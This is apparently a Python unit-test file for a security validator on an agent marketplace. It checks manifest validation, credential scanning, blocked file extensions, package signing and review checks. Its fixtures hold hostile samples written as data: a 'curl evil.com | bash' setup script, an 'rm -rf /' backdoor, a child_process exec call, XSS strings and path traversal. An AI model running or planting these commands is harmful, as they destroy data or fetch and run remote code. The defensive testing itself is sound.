"""
tests/test_marketplace_validator.py — Unit tests for marketplace package security.

Run: cd /Users/odin/Documents/ProjectOpenClaw/valhalla-mesh-v2 && python3 -m pytest tests/test_marketplace_validator.py -v
"""
from __future__ import annotations

import hashlib
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from plugins.marketplace.validator import (
    validate_manifest,
    validate_package,
    scan_for_credentials,
    validate_review,
    validate_price_change,
    sign_package,
    verify_package_signature,
    ALLOWED_EXTENSIONS,
    BLOCKED_EXTENSIONS,
)


class TestManifestValidation(unittest.TestCase):
    """Manifest schema validation."""

    def test_valid_manifest(self):
        issues = validate_manifest({
            "name": "sales-agent",
            "version": "1.2.0",
            "description": "A sales assistant agent.",
            "author": "odin",
            "price": 9.99,
        })
        self.assertEqual(issues, [])

    def test_missing_required_keys(self):
        issues = validate_manifest({"name": "test"})
        self.assertTrue(any("version" in i for i in issues))
        self.assertTrue(any("description" in i for i in issues))

    def test_unknown_keys_rejected(self):
        issues = validate_manifest({
            "name": "test",
            "version": "1.0.0",
            "description": "ok",
            "evil_payload": "hack",
        })
        self.assertTrue(any("Unknown manifest keys" in i for i in issues))

    def test_invalid_name(self):
        issues = validate_manifest({
            "name": "../escape/hack",
            "version": "1.0.0",
            "description": "ok",
        })
        self.assertTrue(any("Invalid name" in i for i in issues))

    def test_invalid_version(self):
        issues = validate_manifest({
            "name": "test",
            "version": "not-semver",
            "description": "ok",
        })
        self.assertTrue(any("Invalid version" in i for i in issues))

    def test_negative_price(self):
        issues = validate_manifest({
            "name": "test",
            "version": "1.0.0",
            "description": "ok",
            "price": -5,
        })
        self.assertTrue(any("Invalid price" in i for i in issues))

    def test_xss_in_description(self):
        issues = validate_manifest({
            "name": "test",
            "version": "1.0.0",
            "description": "Great agent! <script>alert('xss')</script>",
        })
        self.assertTrue(any("XSS" in i for i in issues))

    def test_xss_in_author(self):
        issues = validate_manifest({
            "name": "test",
            "version": "1.0.0",
            "description": "ok",
            "author": '<img onerror="alert(1)">',
        })
        self.assertTrue(any("XSS" in i for i in issues))


class TestCredentialScanning(unittest.TestCase):
    """Credential and PII detection."""

    def test_clean_text(self):
        findings = scan_for_credentials(
            "This agent helps with sales conversations."
        )
        self.assertEqual(findings, [])

    def test_detects_openai_key(self):
        findings = scan_for_credentials(
            "api_key: sk-1234567890abcdef1234567890abcdef"
        )
        self.assertTrue(len(findings) > 0)

    def test_detects_nvidia_key(self):
        findings = scan_for_credentials(
            "Use nvapi-abc123def456ghi789jkl012mnop345 for inference"
        )
        self.assertTrue(any("NVIDIA" in f["type"] for f in findings))

    def test_detects_github_token(self):
        findings = scan_for_credentials(
            "token: ghp_abcdefghijklmnopqrstuvwxyz1234567890"
        )
        self.assertTrue(any("GitHub" in f["type"] for f in findings))

    def test_detects_aws_key(self):
        findings = scan_for_credentials(
            "key: AKIAIOSFODNN7EXAMPLE"
        )
        self.assertTrue(any("AWS" in f["type"] for f in findings))

    def test_detects_private_key(self):
        findings = scan_for_credentials(
            "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."
        )
        self.assertTrue(any("Private key" in f["type"] for f in findings))

    def test_detects_email(self):
        findings = scan_for_credentials(
            "Contact: user@company.com for support"
        )
        self.assertTrue(any("Email" in f["type"] for f in findings))

    def test_detects_tailscale_ip(self):
        findings = scan_for_credentials(
            "Connect to node at 100.117.255.38"
        )
        self.assertTrue(any("Tailscale" in f["type"] for f in findings))


class TestPackageValidation(unittest.TestCase):
    """Full package directory validation."""

    def _create_package(self, files: dict) -> Path:
        """Helper: create a temp package dir with given files."""
        d = Path(tempfile.mkdtemp())
        for name, content in files.items():
            p = d / name
            p.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, bytes):
                p.write_bytes(content)
            else:
                p.write_text(content)
        return d

    def test_valid_package(self):
        pkg = self._create_package({
            "manifest.yaml": (
                "name: test-agent\nversion: 1.0.0\n"
                "description: A test agent\n"
            ),
            "SOUL.md": "# Soul\nI am helpful.",
            "IDENTITY.md": "# Identity\nI help with tasks.",
            "procedures.json": '{"procedures": []}',
        })
        issues = validate_package(pkg)
        self.assertEqual(issues, [])

    def test_blocks_python_file(self):
        pkg = self._create_package({
            "manifest.yaml": "name: evil\nversion: 1.0.0\ndescription: hack\n",
            "backdoor.py": "import os; os.system('rm -rf /')",
        })
        issues = validate_package(pkg)
        self.assertTrue(any("BLOCKED" in i and ".py" in i for i in issues))

    def test_blocks_shell_script(self):
        pkg = self._create_package({
            "manifest.yaml": "name: evil\nversion: 1.0.0\ndescription: hack\n",
            "setup.sh": "#!/bin/bash\ncurl evil.com | bash",
        })
        issues = validate_package(pkg)
        self.assertTrue(any("BLOCKED" in i and ".sh" in i for i in issues))

    def test_blocks_javascript(self):
        pkg = self._create_package({
            "manifest.yaml": "name: evil\nversion: 1.0.0\ndescription: hack\n",
            "payload.js": "require('child_process').exec('whoami')",
        })
        issues = validate_package(pkg)
        self.assertTrue(any("BLOCKED" in i and ".js" in i for i in issues))

    def test_blocks_unknown_extension(self):
        pkg = self._create_package({
            "manifest.yaml": "name: test\nversion: 1.0.0\ndescription: ok\n",
            "data.xyz": "unknown",
        })
        issues = validate_package(pkg)
        self.assertTrue(any("unknown file type" in i for i in issues))

    def test_detects_credentials_in_content(self):
        pkg = self._create_package({
            "manifest.yaml": "name: test\nversion: 1.0.0\ndescription: ok\n",
            "config_fragment.yaml": "api_key: sk-realkey12345678901234567890abcdef",
        })
        issues = validate_package(pkg)
        self.assertTrue(any("CREDENTIAL" in i for i in issues))

    def test_missing_manifest(self):
        pkg = self._create_package({
            "SOUL.md": "# Soul",
        })
        issues = validate_package(pkg)
        self.assertTrue(any("Missing manifest" in i for i in issues))


class TestPackageSigning(unittest.TestCase):
    """SHA256 package signing and verification."""

    def _create_signed_package(self) -> Path:
        d = Path(tempfile.mkdtemp())
        (d / "manifest.yaml").write_text(
            "name: test\nversion: 1.0.0\ndescription: ok\n"
        )
        (d / "SOUL.md").write_text("# Soul\nI am helpful.")
        sign_package(d)
        return d

    def test_sign_and_verify(self):
        pkg = self._create_signed_package()
        self.assertTrue(verify_package_signature(pkg))

    def test_tampered_content_fails(self):
        pkg = self._create_signed_package()
        # Tamper with content
        (pkg / "SOUL.md").write_text("# HACKED SOUL")
        self.assertFalse(verify_package_signature(pkg))

    def test_unsigned_package_fails(self):
        d = Path(tempfile.mkdtemp())
        (d / "manifest.yaml").write_text(
            "name: test\nversion: 1.0.0\ndescription: ok\n"
        )
        self.assertFalse(verify_package_signature(d))

    def test_missing_manifest_fails(self):
        d = Path(tempfile.mkdtemp())
        (d / "SOUL.md").write_text("hello")
        self.assertFalse(verify_package_signature(d))


class TestReviewValidation(unittest.TestCase):
    """Marketplace review validation."""

    def test_valid_review(self):
        issues = validate_review({
            "rating": 5,
            "text": "This agent is amazing for sales conversations!",
            "author": "odin",
        })
        self.assertEqual(issues, [])

    def test_invalid_rating(self):
        issues = validate_review({
            "rating": 6,
            "text": "Good agent for work.",
            "author": "odin",
        })
        self.assertTrue(any("Rating" in i for i in issues))

    def test_short_review(self):
        issues = validate_review({
            "rating": 4,
            "text": "ok",
            "author": "odin",
        })
        self.assertTrue(any("too short" in i for i in issues))

    def test_xss_in_review(self):
        issues = validate_review({
            "rating": 5,
            "text": "Great agent! <script>alert('xss')</script> Would buy again.",
            "author": "odin",
        })
        self.assertTrue(any("XSS" in i for i in issues))

    def test_missing_author(self):
        issues = validate_review({
            "rating": 5,
            "text": "This is a great agent for work.",
        })
        self.assertTrue(any("author" in i for i in issues))


class TestPriceChange(unittest.TestCase):
    """Price immutability enforcement."""

    def test_same_price_allowed(self):
        issues = validate_price_change(9.99, 9.99)
        self.assertEqual(issues, [])

    def test_price_change_blocked(self):
        issues = validate_price_change(9.99, 19.99)
        self.assertTrue(any("admin approval" in i for i in issues))

    def test_admin_can_change_price(self):
        issues = validate_price_change(9.99, 19.99, is_admin=True)
        self.assertEqual(issues, [])

    def test_negative_price_blocked(self):
        issues = validate_price_change(None, -5.0)
        self.assertTrue(any("negative" in i for i in issues))

    def test_first_publish_no_issue(self):
        issues = validate_price_change(None, 9.99)
        self.assertEqual(issues, [])


class TestExtensionSets(unittest.TestCase):
    """Verify no overlap between allowed and blocked extensions."""

    def test_no_overlap(self):
        overlap = ALLOWED_EXTENSIONS & BLOCKED_EXTENSIONS
        self.assertEqual(overlap, set(), f"Extensions in both sets: {overlap}")

    def test_common_executables_blocked(self):
        for ext in [".py", ".js", ".sh", ".exe", ".bat"]:
            self.assertIn(ext, BLOCKED_EXTENSIONS)


if __name__ == "__main__":
    unittest.main()
